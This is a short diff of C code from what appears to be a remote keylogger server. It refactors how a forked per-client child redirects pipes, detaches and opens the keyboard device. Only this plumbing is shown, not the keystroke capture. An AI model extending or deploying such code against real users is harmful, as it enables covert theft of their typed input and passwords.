@@ -32,22 +32,22 @@ int	keylogger_function(t_server *server, int index)
 
 	pipe(inpipe_fds);
 	pipe(outpipe_fds);
-	server->clients[index].inpipe_fd = inpipe_fds[1]; //write end for server, we read from 0 here in stdin
-	server->clients[index].outpipe_fd = outpipe_fds[0]; //read end for server, we write in 1 here
+	server->clients[index].inpipe_fd = inpipe_fds[WRITE_END]; //write end for server, we read from 0 here in stdin
+	server->clients[index].outpipe_fd = outpipe_fds[READ_END]; //read end for server, we write in 1 here
 
 	pid = fork();
 	if (pid < 0) {
 		perror("fork");
 	}
 	else if (pid == 0) {
-		setsid();
+		//setsid();
 
 		close(server->fd);
-		dup2(inpipe_fds[0], STDIN_FILENO);
-		dup2(outpipe_fds[1], STDERR_FILENO);
-		dup2(outpipe_fds[1], STDOUT_FILENO);
-		close(outpipe_fds[0]);
-		close(inpipe_fds[1]);
+		dup2(inpipe_fds[READ_END], STDIN_FILENO);
+		//dup2(outpipe_fds[1], STDERR_FILENO);
+		dup2(outpipe_fds[WRITE_END], STDOUT_FILENO);
+		close(outpipe_fds[READ_END]);
+		close(inpipe_fds[WRITE_END]);
 		close(client_fd);
 		int	kb;
 		if (!keyboardFound(DEV_PATH, &kb)) {
@@ -80,6 +80,8 @@ int	keylogger_function(t_server *server, int index)
 	}
 	else if (pid > 0) {
 		ft_lstadd_back(&server->pids, ft_lstnew((void *)(long)pid));
+		close(inpipe_fds[READ_END]);
+		close(outpipe_fds[WRITE_END]);
 	}
 	return (1);
 }
